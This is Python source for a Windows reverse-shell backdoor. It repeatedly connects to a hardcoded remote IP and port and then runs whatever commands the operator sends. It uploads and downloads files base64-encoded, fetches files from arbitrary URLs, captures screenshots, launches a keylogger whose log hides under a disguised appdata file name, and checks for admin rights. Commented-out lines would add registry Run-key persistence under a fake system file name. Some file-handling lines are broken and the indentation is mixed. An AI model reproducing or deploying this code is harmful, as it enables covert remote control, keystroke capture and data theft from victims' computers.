#!/usr/bin/python
# -*- coding: utf-8 -*-

import socket
import subprocess
import json
import os
import base64
import time
import requests
from mss import mss
import keylogger
import threading

#import shutil
#import sys

def reliable_send(data):
        json_data = json.dumps(data)
        sock.send(json_data)

def reliable_recv():
        data = ""
        while True:
                try:
                        data = data + sock.recv(1024)
                        return json.loads(data)
                except ValueError:
                        continue

def screenshot():
        with mss() as screenshot:
                screenshot.shot()


def is_admin():
        global admin
        try:
                temp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\windows'),'temp']))
        except:
                admin = "[!!] User authorization available"
        else:
                admin = "[+] Admin authorization available"
        

def connection():
        while True:
                time.sleep(20)
                try:
                        sock.connect(("40.115.57.47",17700))
                        shell()
                except:
                        connection()

def download(url):

        file_data = requests.get(url)
        file_name = url.split("/")[-1]
        with open(file_name,"wb") as out_file:
                out_file.write(file_data.content)


def shell():
	while True:
		command = reliable_recv()
		if command == "q":
			break

		elif command[:5] == "help":
                        help_option = """
                        download <path> --> Download file from target PC
                        upload <path> --> Send file to target PC
                        get <url> --> Download file from any URL to target computer
                        start <path> --> Runs any program on target PC
                        screenshot --> Takes a screenshot
                        keylog_start --> Launches keylogger on target computer
                        keylog_dump --> Keyboard inputs from the target computer are printed on the screen
                        check --> Checks if admin authority
                        q --> Logs out of Backdoor
                        """
                        reliable_send(help_option)

		elif command[:2] == "cd" and len(command) > 1:
			try:
				os.chdir(command[3:])
			except:
				continue

		elif command[:8] == "download":
                        with open("command[9:]",'rb') as file:
				reliable_send(base64.b64encode(file.read()))
                elif command[:6] == "upload":
                        with open("command[7:]","wb") as fin:
				file_data = reliable_recv()
				fin.write(base64.b64decode(file_data))

                elif command[:3] == "get":
                        try:
                                download(command[4:])
                                reliable_send("[+] The file has been downloaded")
                        except:
                                reliable_send("[-] Error downloading file")

                elif command[:5] == "start":
                        try:
                                subprocess.Popen(command[6:],shell=True)
                                reliable_send("[+] The program is running")
                        except:
                                reliable_send("[!!] Error running program")

                elif command[:10] == "screenshot":
                        try:
                                screenshot()
                                with open("monitor-1.png","rb") as sc:
                                        reliable_send(base64.b64encode(sc.read()))
                                os.remove("monitor-1.png");
                        except:
                                reliable_send("[!!] Error taking screenshot")

                elif command[:5] == "check":
                        try:
                                is_admin()
                                reliable_send(admin)
                        except:
                                reliable_send("[!!] Error in authentication")

                elif command[:12] == "keylog_start":
                        thread = threading.Thread(target=keylogger.start)
                        thread.start()

                elif command[:11] == "keylog_dump":
                        with open(keylogger_path,"r") as file:
                                reliable_send(file.read())
                	
		else:
			proc = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
			result = proc.stdout.read()
			reliable_send(result)


keylogger_path = os.environ["appdata"] + "\\processmanager.txt"
#location = os.environ["appdata"] + "\\windows32.exe"

#if not os.path.exists(location):
	#shutil.copyfile(sys.executable,location)
	#subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"',shell=True)

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

connection()

#sock.connect(("192.168.1.104",17700))

#shell()

sock.close()
